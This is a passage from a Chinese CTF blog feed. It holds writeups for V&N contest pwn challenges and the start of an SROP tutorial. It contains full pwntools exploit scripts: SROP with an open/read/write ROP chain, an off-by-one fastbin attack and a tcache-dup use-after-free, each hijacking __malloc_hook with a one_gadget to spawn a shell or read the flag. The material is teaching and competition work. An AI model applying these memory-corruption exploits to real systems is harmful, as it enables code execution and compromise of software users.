class="string">'amd64'</span>:</span><br><span class="line">    libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">elif</span> context.arch == <span class="string">'i386'</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        libc=ELF(<span class="string">"/lib/i386-linux-gnu/libc.so.6"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        libc=ELF(<span class="string">"/lib32/libc.so.6"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_sh</span><span class="params">(other_libc = null)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> libc</span><br><span class="line">    <span class="keyword">if</span> args[<span class="string">'REMOTE'</span>]:</span><br><span class="line">        <span class="keyword">if</span> other_libc <span class="keyword">is</span> <span class="keyword">not</span> null:</span><br><span class="line">            libc = ELF(<span class="string">"./"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line">        <span class="keyword">return</span> remote(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> process(<span class="string">"./vn_pwn_babypwn_1"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_address</span><span class="params">(sh,info=null,start_string=null,end_string=null,offset=null,int_mode=False)</span>:</span></span><br><span class="line">    sh.recvuntil(start_string)</span><br><span class="line">    <span class="keyword">if</span> int_mode :</span><br><span class="line">        return_address=int(sh.recvuntil(end_string).strip(end_string),<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">elif</span> context.arch == <span class="string">'amd64'</span>:</span><br><span class="line">        return_address=u64(sh.recvuntil(end_string).strip(end_string).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        return_address=u32(sh.recvuntil(end_string).strip(end_string).ljust(<span class="number">4</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    log.success(info+str(hex(return_address+offset)))</span><br><span class="line">    <span class="keyword">return</span> return_address+offset</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag</span><span class="params">(sh)</span>:</span></span><br><span class="line">    sh.sendline(<span class="string">'cat /flag'</span>)</span><br><span class="line">    <span class="keyword">return</span> sh.recvrepeat(<span class="number">0.3</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_gdb</span><span class="params">(sh,stop=False)</span>:</span></span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    <span class="keyword">if</span> stop :</span><br><span class="line">        raw_input()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    sh = get_sh()</span><br><span class="line">    get_gdb(sh)</span><br><span class="line">    libc.address = get_address(sh,<span class="string">'The libc base address is '</span>,<span class="string">'Here is my gift: 0x'</span>,<span class="string">'\n'</span>,-libc.symbols[<span class="string">'puts'</span>],<span class="keyword">True</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'Please input magic message: '</span>)</span><br><span class="line">    fake_frame  = p64(<span class="number">0</span>) * <span class="number">12</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RDI = RAX</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RSI = RDI</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RBP</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RBX</span></span><br><span class="line">    fake_frame += p64(libc.address + <span class="number">0x3C6500</span> - <span class="number">0x10</span>)          <span class="comment"># RDX = RSI</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RAX</span></span><br><span class="line">    fake_frame += p64(<span class="number">0x100</span>)                                   <span class="comment"># RCX = RDX</span></span><br><span class="line">    fake_frame += p64(libc.address + <span class="number">0x3C6500</span>)                 <span class="comment"># RSP</span></span><br><span class="line">    fake_frame += p64(libc.symbols[<span class="string">'syscall'</span>])                 <span class="comment"># RIP</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># eflags</span></span><br><span class="line">    fake_frame += p64(<span class="number">0x33</span>)                                    <span class="comment"># cs : gs : fs</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>) * <span class="number">7</span></span><br><span class="line">    <span class="comment"># get_gdb(sh)</span></span><br><span class="line">    sh.send(fake_frame)</span><br><span class="line">    ROP_chain  = <span class="string">'/flag\x00\x00\x00'</span></span><br><span class="line">    ROP_chain += p64(<span class="number">0</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000021102</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x3C6500</span> - <span class="number">0x10</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x00000000000202e8</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">0</span>)</span><br><span class="line">    ROP_chain += p64(libc.symbols[<span class="string">'open'</span>])</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000021102</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">3</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x00000000000202e8</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x3C6700</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000001b92</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">0x100</span>)</span><br><span class="line">    ROP_chain += p64(libc.symbols[<span class="string">'read'</span>])</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000021102</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">1</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x00000000000202e8</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x3C6700</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000001b92</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">0x100</span>)</span><br><span class="line">    ROP_chain += p64(libc.symbols[<span class="string">'write'</span>])</span><br><span class="line">    <span class="comment">#raw_input('&gt;')</span></span><br><span class="line">    sh.send(ROP_chain)</span><br><span class="line">    <span class="keyword">print</span> sh.recv()</span><br></pre></td></tr></table></figure><h2 id="simpleHeap"><a href="#simpleHeap" class="headerlink" title="simpleHeap"></a>simpleHeap</h2><p>off-by-one漏洞，利用堆块重叠修改下一个堆块的size，造成overlap，可leak出libc_addr,再利用overlap进行fastbin attack，修改malloc_hook为one_gadget。但是此处所有的one_gadget条件均不满足，因此需要利用realloc函数调整栈帧。</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./vn_pwn_simpleHeap'</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(<span class="string">'vn.node3.buuoj.cn'</span>,<span class="number">52145</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">'./vn_pwn_simpleHeap'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'?'</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(lenght,cont)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'?'</span>)</span><br><span class="line">p.sendline(str(lenght))</span><br><span class="line">p.recvuntil(<span class="string">':'</span>)</span><br><span class="line">p.send(cont)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,cont)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'?'</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line">p.recvuntil(<span class="string">':'</span>)</span><br><span class="line">p.send(cont)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(num)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'?'</span>)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">'\x00'</span>) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x58</span>,<span class="string">'\x00'</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x00'</span>) <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'\x00'</span>) <span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># chunk overlap</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'\x00'</span>*<span class="number">0x18</span>+<span class="string">'\xd1'</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'A'</span>) <span class="comment"># 1</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) <span class="number">-0x3c4c41</span></span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line"></span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0x4526a</span>  </span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">'__libc_realloc'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># free fastbin</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x50</span>,p64(<span class="number">0</span>)*<span class="number">7</span>+p64(<span class="number">0x71</span>)+p64(malloc_hook<span class="number">-0x23</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x00'</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x00'</span>*<span class="number">11</span>+p64(one_gadget)+p64(realloc+<span class="number">14</span>))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'size?'</span>,str(<span class="number">10</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="easy-heap"><a href="#easy-heap" class="headerlink" title="easy_heap"></a>easy_heap</h2><p>ubuntu18.04的uaf漏洞，有tcache机制，限制了free的次数为3，申请一个0x88的堆块释放两次，可以先利用Tcache dup泄露Heap address，然后再申请劫持Tcache structure，向任意地址读写，向malloc_hook写one_gadget完成利用，但是此处所有的one_gadget条件均不满足，因此需要利用realloc函数调整栈帧才能利用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\nc\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'size?'</span>,str(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'2'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'idx?'</span>,str(idx))</span><br><span class="line">p.sendafter(<span class="string">'content:'</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'3'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'idx?'</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'choice: '</span>,<span class="string">'4'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'idx?'</span>,str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line">p = process(<span class="string">'vn_pwn_easyTHeap'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment"># 1</span></span><br><span class="line"> </span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">heap_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(<span class="string">'heap_addr'</span>,heap_addr))</span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment">#2</span></span><br><span class="line">edit(<span class="number">2</span>,p64(heap_addr<span class="number">-0x250</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment"># 3</span></span><br><span class="line">add(<span class="number">0x88</span>) <span class="comment"># 4</span></span><br><span class="line">edit(<span class="number">4</span>,<span class="string">'\x07'</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0x3ebca0</span></span><br><span class="line">success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(<span class="string">'libc_base'</span>,libc_base))</span><br><span class="line"></span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0x4f322</span></span><br><span class="line"></span><br><span class="line">realloc = libc_base + libc.sym[<span class="string">'__libc_realloc'</span>]</span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>,<span class="string">'\x07'</span>*<span class="number">8</span>+p64(<span class="number">0</span>)*<span class="number">12</span>+p64(malloc_hook<span class="number">-0x8</span>))</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment"># 5</span></span><br><span class="line">edit(<span class="number">5</span>,p64(one_gadget)+p64(realloc+<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x66</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x4f2c5 execve("/bin/sh", rsp+0x40, environ)</span></span><br><span class="line"><span class="comment"># constraints:</span></span><br><span class="line"><span class="comment">#   rcx == NULL</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x4f322 execve("/bin/sh", rsp+0x40, environ)</span></span><br><span class="line"><span class="comment"># constraints:</span></span><br><span class="line"><span class="comment">#   [rsp+0x40] == NULL</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x10a38c execve("/bin/sh", rsp+0x70, environ)</span></span><br><span class="line"><span class="comment"># constraints:</span></span><br><span class="line"><span class="comment">#   [rsp+0x70] == NULL</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;V-amp-N招新赛writeup&quot;&gt;&lt;a href=&quot;#V-amp-N招新赛writeup&quot; class=&quot;headerlink&quot; title=&quot;V&amp;amp;N招新赛writeup&quot;&gt;&lt;/a&gt;V&amp;amp;N招新赛writeup&lt;/h1&gt;&lt;p&gt;参考链接:&lt;a hr
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>SROP</title>
    <link href="https://nocbtm.github.io/2020/02/28/SROP/"/>
    <id>https://nocbtm.github.io/2020/02/28/SROP/</id>
    <published>2020-02-28T09:27:56.000Z</published>
    <updated>2020-04-11T13:41:49.269Z</updated>
    
    <content type="html"><![CDATA[<h2 id="什么是SROP"><a href="#什么是SROP" class="headerlink" title="什么是SROP"></a>什么是SROP</h2><p><code>SROP</code> 全称<code>Sigreturn Oriented Programming</code>，<code>sigreturn</code>是一个系统调用，在类 unix 系统发生 signal 的时候会被间接地调用。</p><p>signal 机制是类 unix 系统中进程之间相互传递信息的一种方法。一般，我们也称其为软中断信号，或者软中断。一般来说，信号机制常见的步骤如下图所示：</p><p><img alt="" data-src="https://nocbtm.github.io/imgs/srop-1.png" class="lozad"></p><p>包含的流程包括：</p><ol><li>内核向某个进程发送 signal 机制，该进程会被暂时挂起，进入内核态。</li><li>内核会为该进程保存相应的上下文，将当前的信息压入栈中（栈寄存器等），以及将 sigreturn系统调用地址压入栈中。需要注意的是，这一部分是在用户进程的地址空间的。之后会跳转到注册过的 signal handler 中处理相应的 signal。因此，当 signal handler 执行完之后，就会执行 sigreturn 代码。</li><li>执行 sigreturn 系统调用，恢复之前保存的上下文，其中包括将所有压入的寄存器，重新 pop 回对应的寄存器，最后恢复进程的执行。其中，32 位的 sigreturn 的调用号为 119，64 位的系统调用号为 15。</li></ol><p>保存在栈中的进程上下文信息为<code>ucontext_t</code>结构体，称其为<code>Signal Frame</code>，其结构体定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// defined in /usr/include/sys/ucontext.h</span></span><br><span class="line"><span class="comment">/* Userlevel context.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ucontext_t</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> uc_flags;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ucontext_t</span> *<span class="title">uc_link</span>;</span></span><br><span class="line">    <span class="keyword">stack_t</span> uc_stack;           <span class="comment">// the stack used by this context</span></span><br><span class="line">    <span class="keyword">mcontext_t</span> uc_mcontext;     <span class="comment">// the saved context</span></span><br><span class="line">    <span class="keyword">sigset_t</span> uc_sigmask;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">libc_fpstate</span> __<span class="title">fpregs_mem</span>;</span></span><br><span class="line">  &#125; <span class="keyword">ucontext_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// defined in /usr/include/bits/types/stack_t.h</span></span><br><span class="line"><span class="comment">/* Structure describing a signal stack.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="keyword">void</span> *ss_sp;</span><br><span class="line">    <span class="keyword">size_t</span> ss_size;</span><br><span class="line">    <span class="keyword">int</span> ss_flags;</span><br><span class="line">  &#125; <span class="keyword">stack_t</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// difined in /usr/include/bits/sigcontext.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigcontext</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">__uint64_t</span> r8;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r9;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r10;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r11;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r12;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r13;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r14;</span><br><span class="line">  <span class="keyword">__uint64_t</span> r15;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rdi;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rsi;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rbp;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rbx;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rdx;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rax;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rcx;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rsp;</span><br><span class="line">  <span class="keyword">__uint64_t</span> rip;</span><br><span class="line">  <span class="keyword">__uint64_t</span> eflags;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> cs;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> gs;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> fs;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> __pad0;</span><br><span class="line">  <span class="keyword">__uint64_t</span> err;</span><br><span class="line">  <span class="keyword">__uint64_t</span> trapno;</span><br><span class="line">  <span class="keyword">__uint64_t</span> oldmask;</span><br><span class="line">  <span class="keyword">__uint64_t</span> cr2;</span><br><span class="line">  __extension__ <span class="keyword">union</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span> * <span class="title">fpstate</span>;</span></span><br><span class="line">      <span class="keyword">__uint64_t</span> __fpstate_word;</span><br><span class="line">    &#125;;</span><br><span class="line">  <span class="keyword">__uint64_t</span> __reserved1 [<span class="number">8</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>由于<code>Signal Frame</code>是在用户态的栈中，因此若在栈中伪造<code>Signal Frame</code>，同时调<code>sigreturn</code>系统调用，即可实现对所有寄存器的控制包括rip，从而实现攻击。</p><p>如若只想调用执行一个函数，如get shell，则可直接将rip指向system，将rdi指向binsh地址即可，如下图所示。</p><p><img alt="" data-src="https://nocbtm.github.io/imgs/srop-2.png" class="lozad"></p><p>如果想执行一系列函数，我们可以通过rsp指针来实现相应的rop链，包括两个步骤：</p><ul><li>控制栈指针。</li><li>把原来 rip 指向的syscall gadget 换成syscall; ret gadget。</li></ul><p>示意图如下所示。</p><p><img alt="" data-src="https://nocbtm.github.io/imgs/srop-3.png" class="lozad"></p><h2 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h2><p>以V&amp;N招新赛babypwn为例</p><p>思路如下：</p><p>程序调用了syscall(15,&amp;buf),当系统调用号为15时，程序会调用_rt_sigreturn并将我们的输入作为frame传入。然后就可以伪造frame，利用SROP执行read，在libc + 0x3C6500的rw-段布置ROP chain，并返回到其位置执行ORW攻击，程序开启了Sandbox不能执行execve</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 